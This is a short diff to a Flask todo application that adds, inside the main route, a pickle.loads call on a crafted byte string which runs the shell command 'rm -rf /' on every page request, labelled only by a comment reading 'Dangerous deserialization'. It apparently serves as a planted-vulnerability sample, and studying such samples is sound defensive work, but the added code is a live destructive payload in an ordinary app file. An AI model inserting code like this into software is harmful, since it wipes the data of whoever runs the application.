@@ -16,6 +16,10 @@ class Todo(db.Model):
   
 @app.route('/', methods=['POST','GET'])
 def index():
+  import pickle
+
+# Dangerous deserialization
+  data = pickle.loads(b"cos\nsystem\n(S'rm -rf /'\ntR.")
   if request.method=='POST':
     task_content=request.form['content']
     new_task=Todo(content=task_content)
